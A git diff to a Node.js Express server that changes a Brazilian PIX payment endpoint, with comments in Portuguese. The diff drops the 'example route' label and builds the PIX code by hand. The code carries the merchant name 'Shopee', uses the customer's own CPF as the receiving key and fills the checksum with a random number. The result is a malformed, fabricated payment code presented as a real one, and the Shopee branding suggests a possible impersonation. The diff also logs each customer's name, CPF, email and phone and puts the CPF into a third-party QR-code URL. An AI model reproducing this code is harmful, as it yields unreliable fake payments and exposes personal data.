@@ -89,9 +89,11 @@ app.get('/api/regions', (req, res) => {
   res.json(mockRegions);
 });
 
-// Configuração para pagamentos (rota de exemplo)
+// Configuração para pagamentos
 app.post('/api/payments/create-pix', (req, res) => {
-  const { name, cpf, email, amount } = req.body;
+  const { name, cpf, email, phone, amount } = req.body;
+  
+  console.log('Recebido pedido de pagamento:', { name, cpf, email, phone, amount });
   
   // Verificação básica de dados
   if (!name || !cpf || !amount) {
@@ -101,14 +103,22 @@ app.post('/api/payments/create-pix', (req, res) => {
   // Gerar ID único para o pagamento
   const paymentId = `pix_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
   
-  // Simulação de uma resposta da API de pagamento
+  // Criar código PIX e QR code para pagamento
+  const pixCode = `00020126580014BR.GOV.BCB.PIX0136${cpf}5204000053039865802BR5913Shopee${name}6009SAO PAULO62070503***6304${Math.floor(Math.random() * 10000)}`;
+  const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
+  
+  // Resposta da API com os dados do pagamento
   const pixResponse = {
     id: paymentId,
-    pixCode: `00020126580014BR.GOV.BCB.PIX0136${cpf}5204000053039865802BR5913Shopee${name}6009SAO PAULO62070503***6304${Math.floor(Math.random() * 10000)}`,
-    pixQrCode: `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(`pixcode-for-${cpf}`)}`,
+    pixCode: pixCode,
+    pixQrCode: pixQrCode,
     status: 'pending'
   };
   
+  // Log da resposta
+  console.log('Enviando resposta de pagamento:', pixResponse);
+  
+  // Enviar resposta
   res.json(pixResponse);
 });
 
